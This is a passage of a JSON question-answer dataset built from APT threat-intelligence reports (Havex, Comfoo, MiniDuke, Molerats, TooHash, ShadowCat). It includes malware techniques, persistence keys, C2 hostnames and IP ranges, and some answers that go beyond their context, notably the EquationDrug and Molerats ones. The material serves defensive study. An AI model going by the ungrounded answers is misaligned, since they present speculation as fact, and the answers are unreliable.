C:\\ProgramData\\Mail\\MailAg /f scs.jpg > C:\\ProgramData\\Mail\\MailAg\\scs.txt\"\nThen it deletes the directory C:\\ProgramData\\Cap and all the files in it, deletes itself and exits.\nIt uses encrypted strings - XOR with progressively incremented value.\n3rd stage 3rd party screenshot tool\nCap.exe is indeed the DuckLink CmdCapture tool - a 3rd party freeware AutoIt application (AutoIt version 3.3.6.1) for capturing the screenshots, available here http://www.ducklink.com/p/download/\nThis application is dropped by the scs.exe module and run using following command line parameters: /d C:\\ProgramData\\Mail\\MailAg /f scs.jpg > C:\\ProgramData\\Mail\\MailAg\\scs.txt\nThe /d parameter specifies the destination directory\nThe /f parameter specifies the filename for the screenshot file.\nText output produced by application is redirected to the C:\\ProgramData\\Mail\\MailAg\\scs.txt file and contains information such as:\n\u2022 Day and time of capture\n\u2022 Computer name\n\u2022 Username\n\u2022 Cpu architecture\n\u2022 Os version\n\u2022 IP address\n\u2022 Logon domain and logon server\n\u2022 Desktop details (height, width, depth, refresh rate)\n\u2022 Environmental variables\nDescription of the DuckLink CmdCapture functionalities from the README file that comes with the application:\nThis freeware program designed to capture images of the screen.\nMain Features:\n* Full Screen Capture (display selection support).\n* Window Capture.\n* Selected area capture.\n* Save captured image in silent mode.\n* Open captured image in graphic editor.\n* Print captured image.\n* Put captured image to clipboard.\n* Upload captured image (to image hosting services).\n* Images format support:\nPNG\nGIF\nJPG - Quality can be set.\nBMP - Format can be set.\nMedium Headline: Example of part of the content of the scs.txt file:\nSample Value: 23\n@MDAY: Current day of month. Range is 01 to 31\nSample Value: 22\n@MIN: Minutes value of clock. Range is 00 to 59\nSample Value: 19\n@MON: Current month. Range is 01 to 12\nSample Value: 07\n@MSEC: Milliseconds value of clock.  Range is 00 to 999\nSample Value: 050\n@SEC: Seconds value of clock. Range is 00 to 59\nSample Value: 52\n@WDAY: Numeric day of week. Range is 1 to 7 which corresponds to Sunday through Saturday.\nSample Value: 3\n@YDAY: Current day of year. Range is 001 to 366 (or 001 to 365 if not a leap year) Sample Value: 203\n@YEAR: Current four-digit year\nSample Value: 2014\n@ComputerName: Computer's network name.\nSample Value: WINXP\n@ComSpec: value of %comspec%, the SPECified secondary COMmand interpreter; primarily for\ncommand line uses, e.g.  Run(@ComSpec & \" /k help | more\")\nSample Value: C:\\WINDOWS\\system32\\cmd.exe\n@CPUArch: Returns \"X86\" when the CPU is a 32-bit CPU and \"X64\" when the CPU is 64-bit. Sample Value: X64\n@HomeShare: Server and share name containing current user's home directory.\nSample Value:\n@IPAddress1: IP address of first network adapter. Tends to return 127.0.0.1 on some computers.\nSample Value: 192.168.56.11\n@IPAddress2: IP address of second network adapter. Returns 0.0.0.0 if not applicable. Sample Value: 0.0.0.0\n@IPAddress3: IP address of third network adapter. Returns 0.0.0.0 if not applicable.\nSample Value: 0.0.0.0\n@IPAddress4: IP address of fourth network adapter. Returns 0.0.0.0 if not applicable. Sample Value: 0.0.0.0\n@LogonDNSDomain: Logon DNS Domain.\nSample Value:\n@LogonDomain: Logon Domain.\nSample Value: WINXP\n--- snip ---\nMedium Headline: \"source.php\"\nThe Backdoors interact with \"source.php\", which is the control script. Following the functions on execution:\n1. Collects the following Information:\n2. Writes the above information to \"testlog.php\", separated by \"Tabulator\" and base64-encoded, with the following syntax:\n<timestamp>\\t<victim ip-address>\\t<proxy>\\t<botID>\\t<request-uri>\\t<useragent>\n3. Writes all transferred HTTP-GET Variables to \"<botID>.log\", separated by \"Tabulator\" and base64-encoded.\n4. If the bot executed an HTTP-POST-request, the transferred data is written to the file \"<botID>. ans\", enclosed in \"xdata\"-Tag with timestamp. (\"ans\" is the acronym for \"Answer\")\n5. Checks for any file \"<botID>_*.txt\"\na. If found the timestamp, filename and Status \"sent\" are first appended to \"<botID>.log\". Then the file content is transferred to the bot, embedded into HTML with HTML-Body \"No data!\" and HTML-Comment \"Havex\" containing the data to be transferred. Finally the file on the server will be removed. If removal fails it's logged to \"<botID>.log\".\nb. If no matching file is found, a HTML-Response is sent with an empty \"Havex\" HTML-Comment and HTML-Body text \"Sorry, no data corresponding to your request.\"\n\nExplain the methodology used by the malware to extract and monitor credentials from Internet Explorer and other browsers. How does it handle the extracted data?",
    "output": "A: The malware extracts credentials from Internet Explorer's password manager and saves them to a file named prx.jpg in the malicious folder. It continuously monitors these credentials in a loop and updates the file accordingly. Additionally, it checks if any browser processes (including Internet Explorer, Firefox, Mozilla, and Opera) are running and injects a DLL to spy on basic authentication credentials sent via HTTP traffic. The extracted data is stored locally and presumably sent to the Command and Control (C2) server for further use.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Conclusion\nComfoo is the tip of an iceberg. The CTU research team notified many Comfoo victims, either directly or through the computer security incident response teams (CSIRTs) in their respective country. Analysis was also shared with law enforcement. Based on the number of campaign tags observed in malware samples versus those seen in live monitoring by the CTU research team, there are likely hundreds more unidentified victims.\nMost businesses will never see a Comfoo infection. However, evaluating whether an organization is a potential target of cyber-espionage is important in any risk evaluation. Chief information security officers should maintain awareness of any reported cyber-espionage threats in their business sector. If one player in an industry is targeted, it is likely all major players (or newcomers with interesting technology) in that industry will be targets at some point.\nOrganizations compromised by Comfoo (or most types of APT malware) likely face a major forensic and eradication effort. This effort should be followed by a major investment in security measures to keep cyber-espionage actors out of the network. Many in-house security teams do not have the (<http://go.secureworks.com/advancedthreats>)APT expertise to respond to a persistent threat that requires a persistent, active, and layered defense model spanning the entire attack surface of an organization. As a result, the organization might need outside expertise to effectively mitigate these types of threats.\nBig Headline: Appendix: Comfoo hostnames for blacklisting consideration\naccounts . ddns . info active . googleupdate . hk active . nifty-user . com addr . googleupdate . hk ahn06 . myfw . us allroot80 . 4pu . com apf . googleupdate . hk aptlkxqm . 25u . com back . agfire . com back . winsupdate . com bbs . dynssl . com bbs . gladallinone . com bigdog . winself . com billgates . itsaol . com bjllgvtms . effers . com blizzcon . sexidude . com blizzcon . sexxxy . biz buffet80 . bigmoney . biz buffet80 . itsaol . com buffet . bbsindex . com bxpudqx . otzo . com\nmy . amazingrm . com my . officebeautyclub . com myweb . wwwcrazy . com nevruz . mrface . com news . mcesign . com news . rumorse . com news . win . dnset . com news . wintersunshine . net night . mefound . com nikimen . etowns . net nslsa . microupdata . com nsser . systemsupdata . com nsservic . googleupdate . hk nunok . ninth . biz oct . clawsnare . com offer . eosboxster . com okkou . 9966 . org park006 . myfw . us pazar . vicp . net pcnews . rr . nu pcpc . helpngr . net\nmsnsupport . servehttp . com\nzp . amazingrm . com zp . tpznet . com\n\nWhy is it crucial for chief information security officers to stay informed about cyber-espionage threats within their industry, particularly in the context of Comfoo?",
    "output": "It is crucial for chief information security officers to stay informed about cyber-espionage threats within their industry because if one player in an industry is targeted, it is likely that all major players or newcomers with interesting technology in that industry will be targets at some point. This awareness helps in evaluating whether an organization is a potential target of cyber-espionage, which is important in any risk evaluation. By staying informed, CISOs can better prepare and implement security measures to protect their organizations from advanced persistent threats like Comfoo.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Investigation: WannaCry cyber attack and the NHS\nHC 414 SESSION 2017\u20132019 27 OCTOBER 2017\nOur vision is to help the nation spend wisely. Our public audit perspective helps Parliament hold government to account and improve public services.\nThe National Audit Office scrutinises public spending for Parliament and is independent of government. The Comptroller and Auditor General (C&AG), Sir Amyas Morse KCB, is an Officer of the House of Commons and leads the NAO. The C&AG certifies the accounts of all government departments and many other public sector bodies. He has statutory authority to examine and report to Parliament on whether departments and the bodies they fund have used their resources efficiently, effectively, and with economy. Our studies evaluate the value for money of public spending, nationally and locally. Our recommendations and reports on good practice help government improve public services, and our work led to audited savings of \u00a3734 million in 2016.\nAnswer this question: How does the National Audit Office (NAO) contribute to improving public services and ensuring efficient use of resources in the context of cybersecurity incidents like the WannaCry attack?",
    "output": "The National Audit Office (NAO) plays a crucial role in improving public services and ensuring efficient use of resources by scrutinizing public spending for Parliament. The NAO is independent of the government and is led by the Comptroller and Auditor General (C&AG), who certifies the accounts of all government departments and many other public sector bodies. The NAO evaluates the value for money of public spending and provides recommendations and reports on good practice to help the government improve public services. For instance, in the context of the WannaCry cyber attack, the NAO's investigations and reports can provide insights into how government departments and healthcare organizations can better prepare for and respond to such incidents, thereby enhancing overall cybersecurity measures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Summary\nSecureWorks\u00ae Counter Threat Unit\u2122 (CTU) researchers track the activities of Threat Group-4127(TG-4127), which traditionally targets governments, military,international non-governmental organizations (NGOs), and most recently, (<https://www.secureworks.com/research/threat-group-4127-targets-hillary-clinton-presidential-campaign>)Hillary Clinton's email. Components of TG-4127 operations have been reported under the names APT28, Sofacy, Sednit, Fancy Bear, and Pawn Storm. CTU\u2122 researchers assess with moderate confidence that the group is operating from the Russian Federation and is gathering intelligence on behalf of the Russian government.\nIn June 2016, CTU researchers published (<https://www.secureworks.com/research/threat-group-4127-targets-hillary-clinton-presidential-campaign>)analysis of a TG-4127 campaign that targeted email accounts linked to Hillary Clinton's 2016 presidential campaign and the U.S. Democrat National Committee. The activity used the same technique as a 2015 spearphishing campaign that targeted more than 1,800 Google Accounts. The threat group used the Bitly URL-shortening service to hide the location of a spoofed Google login page. Many of the accounts in the 2015 campaign belonged to individuals in Russia and the former Soviet states, but some belonged to current and former military and government personnel in the U.S. and Europe, individuals working in the defense and government supply chain, and authors and journalists, particularly those with an interest in Russia. The range of targets demonstrates that the threat group poses a broad threat to individuals and groups associated with U.S. politics, to organizations and individuals in the government and defense verticals, and to those whose business involves commenting on Russia.\nAnswer this question: How did Threat Group-4127 (TG-4127) leverage the Bitly URL-shortening service to enhance the effectiveness of their spearphishing campaigns targeting Google Accounts? Why was this technique particularly effective against a diverse range of targets including government personnel, journalists, and individuals involved in U.S. politics?",
    "output": "Threat Group-4127 (TG-4127) utilized the Bitly URL-shortening service to conceal the true destination of links in their spearphishing emails, directing users to a spoofed Google login page. This technique was particularly effective because it obscured the malicious intent behind the links, making them appear legitimate and thus increasing the likelihood that targets would click on them. The range of targets included individuals in Russia and former Soviet states, as well as current and former military and government personnel in the U.S. and Europe, individuals working in the defense and government supply chain, and authors and journalists, especially those interested in Russia. The diversity of these targets highlights the broad threat posed by TG-4127 to individuals and groups associated with U.S. politics, government and defense verticals, and those whose business involves commenting on Russia.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the MiniDuke malware ensure persistence across different versions, and what changes were observed in its persistence mechanisms from 2011 to 2013?",
    "output": "The MiniDuke malware ensures persistence by modifying system settings to automatically start after a reboot. For samples in 2011/2012, it modifies the Shell key in Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon to include an environment variable set to 'rundll32.exe <path_to_dll>, <export_name>'. For samples collected in 2013, the malware adds a .lnk file to the Startup directory, which executes the DLL using rundll32.exe. If a previous version of the malware is detected, the new version deletes it and creates a new combination of names and environment variables or .lnk files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the EquationDrug APT use data obfuscation to conceal its command and control communications?",
    "output": "Data obfuscation is a technique used by adversaries to hide command and control (C2) communications from detection. In the case of the EquationDrug APT, data obfuscation is used to conceal its C2 communications. Although the #Given Context# does not explicitly mention data obfuscation, it does mention that 'most of this information is carefully protected with obfuscation or encryption algorithms to prevent quick recognition.' This suggests that the EquationDrug APT uses data obfuscation to hide its internal strings and codenames, making it more difficult for analysts to understand the malware's behavior. Furthermore, the use of custom message-passing interfaces and kernel-mode components may also be used to obfuscate C2 communications. Additionally, the #Given Context# mentions that the link timestamp can be altered by the developer in a way that's not always possible to spot, which could be another form of data obfuscation used by the EquationDrug APT. Overall, the EquationDrug APT likely uses data obfuscation to conceal its C2 communications and make it more difficult for analysts to detect and understand its behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Foreword\nThis report is a follow-up on our DustySky operation report from January 20161. It analyses new attacks by Molerats against targets in Israel, The United States, Egypt, Saudi Arabia, United Arab Emirates and The Palestinian Authority.\nWe elaborate on the scope and targeting of the DustySky campaign and expose new infrastructure and incidents. In addition, we expose the identity of an individual who is behind the DustySky campaign. Following the previous report, this individual has contacted us trying to learn what we know about him.\nAttacks against all targets in the Middle East stopped at once, after we published our first report. However, the attacks against targets in the Middle East (except Israel) were renewed in less than 20 days. In the beginning of April 2016, we found evidence that the attacks against Israel have been renewed as well2 .\nBased on the type of targets, on Gaza being the source of the attacks, and on the type of information the attackers are after - we estimate with medium-high certainty that the Hamas terrorist organization3 is behind these attacks.\nMedium Headline: Acknowledgments\nThis research was facilitated by the for threat infrastructure analysis.\nWe would like to thank the security researchers and organizations who shared information and provided feedback, which have been crucial for this research.\n2 The report seems to have indeed disrupted the attacker for several months. In a PDB found in a sample from the April wave, there is an indication that the attacker saw that wave as \"part 2\" of the attacks (part 1 being the attacks before the public report): Name D:\\IL\\Working Tools\\2016-04-23 NeD Ver 9 Ran Il - 192.52.167.118\\NeD Download and execute Version 1 - Doc\\bin\\Release\\Obfuscated\\News.pdb\n(C) All Rights reserved to C.S. Consultings Ltd, 2016. \"ClearSky\" www.clearskysec.com\nSmall Headline: Targeting in Hebrew and English\nBelow are examples of lure documents presented to the victim while the malware infects the computer. The content of the document is always copied from an online public source. The subject usually revolves around defense and security or current affairs. Once in a while other topics or content are used - such as a public corporate responsibility document published by Egged, an Israeli bus company; a part of an online Novel published as a doc file; or pornographic materials.\nIntelligence agencies succeeding in penetrating Hezbollah.exe\nIDF survey Research Center\n\u05d5\u05e7\u05e0\u05d3\u05dd\u05d5 \u05dc\u05d0 \u05d5\u05e9\u05de\u05e9\u05de\nSmall Headline: (unused condom)\nLive Webcam For Free\n\u05e9\u05e9\u05d9\u05d4 \u05e8\u05d4\u05d9\u05d2\u05d5\u05dd \u05db\u05d5\n\u05e4\u05d9\u05e2\u05d5\u05e6\u05dd \u05d1\u05ea\u05d4\u05e0\u05d2\u05d5\u05e9\u05ea \u05d0\u05d5\u05d1\u05d5\u05d8\u05d5\u05e1 \u05d5\u05e9\u05de\u05d0\u05ea\u05d9\n.exe-15\n(Six killed and 15 wounded in an collision between bus and tractor trailer)\nIntelligence Report: Israel's strategic position has improved.exe\n\u05d5\u05d3\u05d7 \u05d5\u05d9\u05e8\u05d7\u05d0\u05ea \u05d9\u05d2\u05d0\u05ea\u05d3\u05ea\u05d9 \u05de\u05d9\u05d9\u05e7\u05d5\u05ea\u05d5\n\u05d2\u05d0\u05d3\n.exe-\n(corporate responsibility and sustainability report - Egged)\n\u05de\u05e9\u05d7\u05e7 \u05d0\u05d4\u05d1\u05d4 \u05e2\u05dc\u05e8\u05d5\u05d5\u05d9\u05dd\u05d9\n\u05e8\u05e4\u05e7 \u05d6\n'.exe-\n(blind love game \u2013 chapter G)\nYnet news\nIn a recent wave, a bit.ly link (https://bitly[.]com/1YRoIPX) was used instead of a direct link to the malware (bit.ly is a legitimate URL shortening service). The shortened link statistics page enables us to learn about the scope and the targeting of this threat actor.\nWe can see that the link was clicked 210 times, out of which 130 were in Israel, 32 in the United States, 9 in the Palestinian authority, and 39 from 12 other countries (1-5 each).\nThe statistics do not necessarily reflect the exact distribution of targets: one target may click more than one time; a proxy or VPN may skew the country count; and security researchers and bots may also comprise part of the clicks. However, they do roughly represent the scope of the campaign: tens to few hundreds of recipients - mostly in Israel, the United States and the Palestinian Territories.\nThis corresponds to the distribution we know of based on other sources such as direct reports from targets, cases we have investigated, and open source intelligence.\nSmall Headline: Targeting in arabic\nBelow are examples of a document and a malicious email, targeting Arabic speaking victims.\n\u0645\u062e\u0644\u0635 \u062a\u0631\u0642\u0631\u064a \u0627\u0645\u0644\u0627\u0631\u0628\u0627\u062e\u062a \u0627\u064a\u0644\u0645\u0648\u064a\n.\n(The true story behind the death of the leader Farid Ismail in Scorpio prison)\n\u0627\u0635\u0642\u0644\u0629 \u0627\u0644\u0642\u062d\u064a\u0642\u064a\u0629 \u0644\u0645\u0648\u062a \u064a\u0642\u0644\u0627\u0627\u062f\u064a \u064a\u0631\u0641\u062f \u0645\u0633\u0625\u0639\u0627\u064a\u0644 \u064a\u0641 \u062c\u0633\u0646 \u0627\u0642\u0639\u0644\u0631\u0628\n.exe\nWhen targeting Arab-speaking counties, most targets are in Egypt, Saudi Arabia, The Palestinian authority and United Arab Emirates.\nWe have learned of more than 150 targets in these countries when investigating a breached email account used by the attackers to send further malicious emails.\nAbout 60% of targeted the email addresses where Gmail, Hotmail and Yahoo accounts. The rest of the email accounts were in organizations - both private and governmental.\nWe searched for information about the targets in order to learn the interests of the attackers. Below are examples of targeted individuals and organizations:\n\u2022 Several diplomats and employees of the ministry of foreign affairs in Egypt (20 emails addresses at mfa.gov.eg, investment.gov.eg and other offices).\n\u2022 Egypt's Ambassador in the Ukraine, Counsellor of Permanent Mission of Egypt to the United Nations, the Egyptian Embassy in New Zealand, and Egyptian Embassy in Pakistan.\n\u2022 An individual at the prime minister's office at the Palestinian Authority (both his Gmail account and an account under pmo.pna.ps).\n\u2022 A senior official at the Birzeit University in the Palestinian Authority.\n\u2022 A consultant at West Bank and Gaza Group, The World Bank (worldbank.org).\n\u2022 Israeli banks.\n\u2022 Israeli military and defense companies.\n\u2022 Ministry of Foreign Affairs of Saudi Arabia (2 email addresses at mofa.gov.ae).\n\u2022 Ministry of Foreign Affairs of United Arab Emirates (2 email addresses at mofa.gov.sa).\n\u2022 A banks in Dubai and Abu Dhabi, United Arab Emirates.\n\u2022 A Lobbying organizations in the UK.\n\u2022 Former politician in the UK.\n\u2022 A diplomat the European Commission (ec.europa.eu).\n\u2022 The Royal Hashemite Court in Jordan (rhc.jo).\n\u2022 An employee at the U.S. Department of State (state.gov).\nMedium Headline: What are they after?\nThe malware scans the computer for files that contain certain keywords. The list of keywords, in base64 format, is retrieved from the command and control server as a text file. For example:\nThese words indicate what information the attackers are after - information pertaining to homeland security and military issues; personal documents; credentials, certificates and private keys.\nBelow are keywords that have been used in the recent campaigns:\n\nBased on the above text, answer a question. What specific targets and sectors did the Molerats group focus on in their DustySky campaign, and what types of information were they seeking to gather?",
    "output": "The Molerats group targeted various sectors, including governmental and diplomatic institutions, aerospace and defense industries, financial institutions, journalists, and software developers. Most targets were located in the Middle East, with some in the United States and Europe. When targeting Arabic-speaking countries, most victims were in Egypt, Saudi Arabia, the Palestinian Authority, and the United Arab Emirates. The malware scanned computers for files containing specific keywords related to homeland security, military issues, personal documents, credentials, certificates, and private keys. Examples of targeted individuals and organizations included diplomats, government officials, military and defense companies, and financial institutions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: HACKTIvIST/NATIONAlIST\nHacktivist- and nationalist-motivated cyber actors are a third class of adversary tracked by the CrowdStrike Intelligence team. The goals of these actors may range from causing mischief for laughs to influencing opinions or views about a particular issue. During the course of 2014, there were a few notable events that demonstrate the capabilities of these actors. As electronic voting continues to be used by more and more countries, the targeting of such processes and equipment will continue to expand.\nSmall Headline: OPERATIONS TARGETING ElECTIONS\nIn July 2014, the electronic voter registration system for the then- upcoming Tunisian presidential election suffered a cyber attack, rendering registrations impossible for an unknown amount of time. Sources reported that the authorities had control over the attack and that it was a systematic process, intended to strike the electoral process. This incident is yet another example of cyber attacks targeting electronic voting systems to manipulate an outcome.\nVery Small Headline: CybERbERkUT\nIn February 2014, several bloody protests took place in Ukraine resulting in the ousting of the pro-Russia prime minister, and an interim government was created with the goal of creating closer ties with the european Union (eU). Following the protests, CyberBerkut, a self-proclaimed nationalistic hacking group, began taking credit for hacks against Ukrainian interim leaders. The group was extremely proactive about distributing propaganda decrying the new government and recruiting pro-Russia supporters to engage in participatory Distributed Denial of Service (DDoS) attacks against a multitude of Ukrainian government and media sites. These attacks were likely directed by Russian state services, with the CyberBerkut hacktivists providing a layer of plausible deniability.\nSeveral of the DDoS attacks against Ukraine's Central election Commission (CeC) coincided with Russian state media broadcasts, further suggesting coordination at the state level. In one case, an attack on the CeC occurred around the time the election results were supposed to appear, while a simultaneous broadcast on Russian state media appeared to show false\nNotable Activity\nresults where an extremist candidate won the election by a hefty margin. The goal of the operation was likely to cause temporary confusion over the immediate results of the election and to cause observers to question the legitimacy of the elections, which were touted as being fair and well equipped to withstand attacks. Had the operation been successful, it likely would have incited unrest in Ukraine and supported the Russian narrative that the elections were illegitimate and that Russian intervention was needed to prevent Ukraine from slipping into complete chaos.\nWhereas previous conflicts between Russia and former Soviet states estonia and Georgia saw a much heavier use of cyber tactics used to bring down critical infrastructure and disrupt communications, the efforts against Ukraine appeared muted and designed more for a disinformation campaign to stir unrest in order for Russia to intervene in Ukraine in a \"peacekeeper\" role as it did in Crimea. The widespread publicity the conflict received in global media along with the threat of heavy sanctions imposed by the west may have been a factor in preventing more aggressive cyber action from Russia.\nAlthough the campaign appeared to be ultimately unsuccessful, partly due to a prepared Ukrainian defense, CrowdStrike noted several interesting observations. Though the use of a proxy to carry out attacks for the purposes of plausible deniability is hardly new, the coordination of the propaganda distributed and Russian media reporting was particularly telling with regard to how Russian state services can direct many moving parts in unison to achieve their goals via cyber means. In addition, the participatory DDoS client software CyberBerkut advertised to help launch DDoS attacks against the Ukrainian government actually installed a backdoor on victims' machines, presumably enabling Russian intelligence services to make a new botnet out of the compromised \"volunteers\", which could be used in future conflicts.\nCrowdStrike Intelligence also investigated targeted attacks by CyberBerkut against Ukrainian organizations and entities operating or doing business in Ukraine. CyberBerkut was first observed in March 2014 when it made statements about the illegitimacy of the government that took over Ukraine\nNotable Activity\nupon the ousting of former president, Viktor yanukovych. Around this same time, the group launched DDoS attacks against state-controlled media in the country as well as against NATO entities such as the Cooperative Cyber Defense Center of excellence (CCDCOe). In April, CyberBerkut claimed responsibility for defacing the websites of several private military companies \u2013 Greystone, Triple Canopy, and Academi \u2013 that they claimed were operating on the ground in Ukraine.\nCyberBerkut's operations during 2014 were very much in line with the priorities of the Russian state; however, it is unclear if its activity is directly state sponsored or if it is an independent group carrying out attacks motivated by Russian nationalistic ideals.\n\nQuestion: How did the cyber tactics used against Ukraine differ from those used in previous conflicts with Estonia and Georgia, and what factors might have influenced this change in strategy?\n\nAnswer:",
    "output": "The cyber tactics used against Ukraine were more muted and designed for a disinformation campaign to stir unrest, unlike the heavier use of cyber tactics to bring down critical infrastructure and disrupt communications seen in previous conflicts with Estonia and Georgia. The efforts against Ukraine were aimed at causing confusion over election results and questioning the legitimacy of the elections. Factors that might have influenced this change in strategy include the widespread publicity the conflict received in global media and the threat of heavy sanctions imposed by the West. These factors likely deterred more aggressive cyber action from Russia, leading to a more subtle approach focused on disinformation and propaganda.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Network Communication\nThe malware uses HTTP to communicate to the command and control servers. Here is an example of a request performed by an infected system:\nHost: www.adobeservice.net\nConnection: Keep-Alive\nCache-Control: no-cache\nPragma: no-cache\nThe relevant data is placed after the GET request. Here is the content of the request, decoded by using the code mentioned above:\nHere are the different parts of the data transmitted:\n\uf0a1 Green: the current date and time;\n\uf0a1 Pink: the hostname of the infected machine;\n\uf0a1 Blue: the domain and the username of the infected machine;\n\uf0a1 Yellow: the version of the operation system;\n\uf0a1 Red: a hardcoded string which means \"end of message\".\npaul@gdata:~ $ cat CgAAAAAAAABhAAAAYQAAAMj[\u2026] |base64 -d | ./common \u2013d | cat -e\nM-^B^@^@^@^@^@^@^@X^@^@^@X^@^@^@2014 52d 713\n334LaptopLab^@^@^@^@^@LaptopLab\\paul^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@WindowsXP^@^@^@10\\11\\10^@^ @^@^@$\nMedium Headline: The Driver\nThe main purpose of the driver is to decode the content of the directsx file and to inject the payload into a userland process. The algorithm used to encode the data in the file is a XOR followed by a SUB:\nScreenshot 8: Obfuscation algorithm\nThe values of the XOR and the SUB can be different. The decoding file contains the configuration (command and control) and a library (.dll) to inject in userland. Here is an example of configuration:\nScreenshot 9: Example of configuration\nActually, the library is injected into the process of BitDefender (seccenter.exe), ZoneAlarm (svchost.exe) or 360 (360tray.exe), which means that three popular security products are abused. If the processes are not running on the infected system, the injection is performed into explorer.exe. To perform the injection, the driver uses the API KeStackAttachProcess(). This function allows it to attach the current thread to an address space of a userland process.\nThe name of the rootkit is linked to its device name: \\\\device\\DirectsX and its symbolic name:\n\\\\DosDevices\\DirectsX.\nBig Headline: Command and Control Servers\nWe identified more than 75 different servers. The complete list of domains is available in the appendix. The IP resolved by the domains changed frequently. At the time of writing this report, all known C&C servers were mainly located in Hong Kong, with three different host companies:\n\uf0a1 HONGKONG LONG LIVE NETWORK CO LIMITED\n\uf0a1 ASIA PACIFIC SERVER COMPANY (HK)\n\uf0a1 Simcentric Solution (HK)\nA fourth host company used was located in the US:\n\uf0a1 Ethrn.Net LLC (USA)\nThe IP ranges used by then:\n\uf0a1 103.228.64.0/24\n\uf0a1 111.68.3.0/24\n\uf0a1 112.121.160.0/18\n\uf0a1 180.178.32.0/18\n\uf0a1 216.83.32.0/19\nThe choice of domain names was made to trick the users or the security team during their analysis of the web logs collected. Have a look at two examples used during the TooHash campaign:\n*.cnnic-micro.com\nCNNIC is the acronym for China National Network Information Center. It is the administrative agency for the Internet domain administration in mainland China. The domain above is, of course, not owned by CNNIC.\n*.adobeservice.net the domain seems to be related to Adobe Systems Incorporated, the popular software company. But, unfortunately, the domain is not owned by Adobe either.\n*.intarnetservice.com\nthe domain seems to be a legitimate intranet network, but note the typo in the domain name.\n*.webmailerservices.com\n*.proxydomain.org\n*.privnsb.com\nFor each domain, the attackers add a subdomain, the subdomain is generally assumed to be the name (or the acronym) of the targeted entities. Here is an example: nspo.intarnetservices.com. This could, in the context of the Greater China area, stand for the National Space Organization located in Taiwan.\nThe attackers control infected machines with the help of web servers installed on the C&Cs, they do not need to have remote access. Here is the authentication page of the administration panel and aswe can see, the panel is partly written in Simplified Chinese:\nScreenshot 10: Authentication on the administration panel\nBig Headline: Attribution\nWe did not clearly identify the people behind this campaign. The use of the stolen certificate could point the Shiqiang group, but nothing can be proven.\nAnyway, in our case, the attackers clearly targeted private business and governmental organizations as well. Either the group decided to target governmental entities as well or the stolen certificate is used by several groups.\nIn any case, the attackers are well organized and use a huge and complex infrastructure to manage the infected systems. Furthermore, they use two different malware types in order to always have access to the targeted organizations even if one malware is detected. The second malware becomes a spare wheel. We assume that the people behind the group are professionals.\nBig Headline: Conclusion\nThis campaign showed us once more, that people do not hesitate to use sophisticated and deceptive methods to steal data from companies or governmental organizations. The files submitted to us seem to have targeted companies in the Greater China area but this technology can easily be used against organizations in other countries and regions across the globe. Due to the increasing value of nowadays' trade secrets and political secrets, we believe that the use of this kind of sponsored campaign is very likely to increase in the future.\nCompanies and other entities as well need to increase their security measures and to educate the users about the risks they might encounter while working with a computer \u2013 ranging from social engineering to malware attacks, etc.\nThe exploits used during this campaign are detected by G DATA's exploit protection system and the files involved are detected by our antivirus engines.\nIn case you would like to receive further technical information or would like to contribute any information to this case, please feel free to contact us by using the following email address: toohash.securityblog@gdata.de\n\nQuestion: How does the TooHash campaign utilize command and control servers, and what strategies do the attackers employ to evade detection and attribution?\n\nAnswer:",
    "output": "The TooHash campaign utilizes over 75 different command and control servers, primarily located in Hong Kong with three different host companies: HONGKONG LONG LIVE NETWORK CO LIMITED, ASIA PACIFIC SERVER COMPANY (HK), and Simcentric Solution (HK). A fourth host company is located in the US: Ethrn.Net LLC (USA). The attackers frequently change the IP addresses resolved by the domains. They use domain names designed to trick users or security teams, such as *.cnnic-micro.com, *.adobeservice.net, and *.intarnetservice.com, which mimic legitimate organizations. The attackers control infected machines via web servers without needing remote access. The authentication page of the administration panel is partly written in Simplified Chinese. The attackers remain unidentified, but the use of a stolen certificate suggests a possible link to the Shiqiang group. The campaign targets both private businesses and governmental organizations, indicating a professional and well-organized group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nA security researcher first detected and reported a  in 2023. Based on these similarities, we suspect that the malicious LNK file is distributed to users via spam email. The attack starts with a deceptive shortcut (.LNK) file that deceives users into opening it. Once executed, the .LNK file runs a PowerShell command that drops a malicious .NET loader file and a decoy Word document on the victim's machine. The PowerShell script then invokes methods in the .NET file, which are designed to fetch a steganographic PNG image from a remote server.\nThis image contains a Gzip-compressed payload. The methods also decompress the payload and inject it into the PowerShell.exe process. These actions are executed entirely in memory to avoid detection by security products.\nCyble Research & Intelligence Labs has dubbed this attack \"Operation ShadowCat\" due to its stealthy characteristics, including the use of a C&C server at \"use1.netcatgroup.site\" and the custom \"NetCat\" subprotocol employed for WebSocket communication.\nThe final payload is a RAT written in the Go programming language. This RAT provides extensive control over the infected system, enabling file and directory manipulation, command execution, and interactive communication with a Command & Control server.\nUpon successful infection, this RAT can enable ransomware activities, stage environments for payload deployment, gather detailed system information, perform network scanning, and upload sensitive data from the victim's machine. It also uses tools for Active Directory mapping and credential extraction, facilitating advanced lateral movement and attack strategies. The figure below shows an overview of the infection.\n\nBased on the above text, answer a question. How does Operation ShadowCat leverage steganography and in-memory execution to evade detection, and what are the key components involved in this process?",
